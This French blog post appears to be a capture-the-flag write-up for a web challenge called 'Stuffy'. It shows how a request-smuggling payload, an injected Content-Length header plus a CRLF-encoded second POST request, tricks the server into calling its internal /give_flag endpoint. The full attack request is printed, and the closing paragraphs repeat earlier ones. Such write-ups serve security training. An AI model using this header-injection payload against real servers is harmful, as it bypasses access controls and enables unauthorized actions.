---
layout: post
author: BRO
title: "Stuffy - BraekerCTF"
date: 2024-06-24
categories: [CTF, Web]
background_image: assets/stuffy.jpg
title_color: "#ffffff"
---


Commençons par lire le code qui nous est fourni. On peut voir directement une faille SQL.
![](/assets/posts/Stuffy/stuffy1.png)
Seulement, nous n'avons pas la main sur le username. Il est choisi à partir du fichier `usenames.txt` fourni qui est une liste de username aléatoires + 4 chars aléatoires.
![](/assets/posts/Stuffy/stuffy2.png)

La SQLi est donc pas la bonne piste.

Parmis toutes les routes on peut apercevoir l'endpoint  `/give_flag`
![](/assets/posts/Stuffy/stuffy3.png)
Cette fonction update la valeur du "stuff" avec la valeur de flag pour un user à partir du moment ou la requête vient du serveur lui-même.
On peut essayer de rajouter le Headers à la main mais ça ne marchera pas car c'est le proxy nginx qui modifie les headers.
Il faudrait donc trouver une fonction qui fait une requête et la rediriger vers `/give_flag`.
Ça tombe bien `/set_stuff` fait une requête vers `/update_profile_internal`.

![](/assets/posts/Stuffy/stuffy4.png)
Set_stuff récupère dans un premier temps notre username grâce aux cookies et vérifie que cet user existe bien.
Il récupère ensuite la variable de stuff de la requête et vérifie que la longueur est inférieure à 200.
Les variables special_type, special_val sont de la même façon récupérées puis nétoyées avec les fonction `security_filter`.
Les variables special_type et special_val deviennent des Headers et stuff est une partie du body

Nous avons donc la main sur trois variables stuff, special_val et special_type.
La piste la plus probable est une request smuggling. Essayons.
```
POST /set_stuff HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 228
Origin: http://localhost:3000
DNT: 1
Connection: close
Referer: http://localhost:3000/
Cookie: username=love1987OBCj
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
X-PwnFox-Color: blue

special_type=Content-Length&special_val=80&stuff=aaaaaab%0d%0a%0d%0aPOST /give_flag HTTP/1.1%0d%0aHost: 127.0.0.1:3000%0d%0aContent-Type: application/x-www-form-urlencoded%0d%0aContent-Length: 21%0d%0a%0d%0ausername=love1987OBCj
```

Ici, special_type et special_val forment un header qui va renseigner la première requête (la fin de aaaaaab) = Content-length: 80.
Comment trouve-t-on ce nombre ?
 ![](/assets/posts/Stuffy/stuffy5.png)
Il suffit de trouver la taille de cette string.
![](/assets/posts/Stuffy/stuffy6.png)
Il suffit ensuite de créer la deuxième requête. Puis de rafraîchir la page et nous aurons le flag dans notre stuff.
![](/assets/posts/Stuffy/stuffy7.png)


Ici, special_type et special_val forment un header qui va renseigner la première requête (la fin de aaaaaab) = Content-length: 80. Comment trouve-t-on ce nombre ?

Il suffit de trouver la taille de cette string.

Il suffit ensuite de créer la deuxième requête. Puis de rafraîchir la page et nous aurons le flag dans notre stuff.
